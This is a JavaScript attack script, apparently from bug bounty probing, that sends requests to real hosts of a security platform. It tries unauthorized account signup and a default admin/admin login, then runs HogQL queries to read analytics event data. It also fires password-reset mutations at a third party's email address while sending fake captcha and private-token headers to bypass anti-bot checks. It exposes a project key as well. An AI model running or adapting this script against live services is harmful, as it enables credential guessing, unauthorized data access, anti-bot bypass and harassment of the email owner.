const APP="https://bugsecure.senintel.sn", API="https://bugsecure-api.senintel.sn", P="phc_myGuPycfa9UMAmmXHBjPJrqFhzkpvprNv7xof9DZ5Far";
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
async function F(u,o={}){let e=null;for(let a=0;a<3;a++){try{return await fetch(u,{...o,signal:AbortSignal.timeout(25000)});}catch(x){e=x;await sleep(1500);}}return null;}
async function hit(label,url,o={}){const r=await F(url,o);const t=r?await r.text():"ERR";console.log("  "+label.padEnd(50)+"HTTP "+String(r?.status??0).padEnd(4)+t.replace(/\s+/g," ").slice(0,190));await sleep(600);return{s:r?.status,t};}
const J={"Content-Type":"application/json"};
console.log("=== 1) auto-inscription PostHog (POST /ingest/api/signup) ===");
await hit("signup corps complet",APP+"/ingest/api/signup",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x",first_name:"BB",organization_name:"BB Probe"})});
await hit("signup corps minimal",APP+"/ingest/api/signup",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x"})});
await hit("signup invite_code",APP+"/ingest/api/signup",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x",first_name:"BB",organization_name:"BB",invite_code:"BB_PROBE"})});
await hit("signup teams",APP+"/ingest/api/signup",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x",first_name:"BB",organization_name:"BB",team_name:"BB"})});
await hit("signup /ingest/api/users (POST)",APP+"/ingest/api/users",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x",first_name:"BB"})});
await hit("login (POST /ingest/api/login)",APP+"/ingest/api/login",{method:"POST",headers:J,body:JSON.stringify({email:"bb-probe@example.org",password:"Bb-probe-2026!x"})});
await hit("login avec email plausible de l equipe",APP+"/ingest/api/login",{method:"POST",headers:J,body:JSON.stringify({email:"admin@senintel.sn",password:"admin"})});
console.log("\n=== 2) HogQL avec le bon Content-Type ===");
await hit("POST /ingest/api/projects/<P>/query (count)",APP+`/ingest/api/projects/${P}/query`,{method:"POST",headers:J,body:JSON.stringify({query:{kind:"HogQLQuery",query:"SELECT count() FROM events"}})});
await hit("POST /ingest/api/projects/<P>/query (select 1)",APP+`/ingest/api/projects/${P}/query`,{method:"POST",headers:J,body:JSON.stringify({query:{kind:"HogQLQuery",query:"SELECT 1"}})});
await hit("POST /ingest/api/projects/<P>/query (events limit 1)",APP+`/ingest/api/projects/${P}/query`,{method:"POST",headers:J,body:JSON.stringify({query:{kind:"HogQLQuery",query:"SELECT * FROM events LIMIT 1"}})});
console.log("\n=== 3) forgotPassword : differential du canal anti-bot (PAT / captcha bidon) ===");
const fp={query:`mutation { forgotPassword(email: "williamnex24lechallenge@gmail.com") }`};
await hit("sans en-tete anti-bot",API+"/graphql",{method:"POST",headers:J,body:JSON.stringify(fp)});
await hit("Sec-Private-Token-Challenge-Response bidon",API+"/graphql",{method:"POST",headers:{...J,"Sec-Private-Token-Challenge-Response":"AAAA"},body:JSON.stringify(fp)});
await hit("Private-Token bidon",API+"/graphql",{method:"POST",headers:{...J,"Private-Token":"AAAA"},body:JSON.stringify(fp)});
await hit("X-Turnstile-Response bidon",API+"/graphql",{method:"POST",headers:{...J,"X-Turnstile-Response":"AAAA"},body:JSON.stringify(fp)});
await hit("cf-turnstile-response bidon",API+"/graphql",{method:"POST",headers:{...J,"cf-turnstile-response":"AAAA"},body:JSON.stringify(fp)});
await hit("X-Captcha-Response bidon",API+"/graphql",{method:"POST",headers:{...J,"X-Captcha-Response":"AAAA"},body:JSON.stringify(fp)});
await hit("Sec-Private-Token bidon (jeton prive)",API+"/graphql",{method:"POST",headers:{...J,"Sec-Private-Token":"AAAA"},body:JSON.stringify(fp)});
